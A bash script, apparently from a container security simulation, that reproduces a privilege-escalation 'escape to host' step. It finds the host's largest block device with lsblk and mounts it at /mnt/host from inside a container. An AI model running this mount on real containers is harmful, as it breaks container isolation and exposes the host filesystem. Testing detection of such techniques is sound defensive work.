#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# mount root host filesystem
echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"

# Initialize error variable
error=""

echo "Discovering root host devices and partitions ..."

# Discover root host partition (prefer partitions over raw disks)
# Extract device name using regex to match device pattern (e.g., vda1, sda1, etc.)
device=$(lsblk -o NAME,SIZE,TYPE | grep -E "part" | sort -k2 -h | tail -n 1 | grep -oE '[a-z]+[0-9]+' | head -1)

# If no partition found, fall back to the largest disk
if [[ -z "$device" ]]; then
    device=$(lsblk -o NAME,SIZE,TYPE -d | grep disk | sort -k2 -h | tail -n 1 | grep -oE '[a-z]+[0-9]*' | head -1)
fi

if [[ -z "$device" ]]; then
    error="Failed to discover root host block device"
else
    echo "Trying to mount root host device /dev/${device} ..."
    
    # Create mount point directory
    mkdir -p /mnt/host
    
    # Try to mount root host device
    if ! mount /dev/$device /mnt/host/ >/dev/null 2>&1; then
        error="Failed to mount /dev/$device"
    fi
fi

# Display result
if [[ -n "$error" ]]; then
    echo -e "${RED}Error! $error ${RESET}"
    else
    echo -e "${Green}Success! Mount attempt was successful ${RESET}"
fi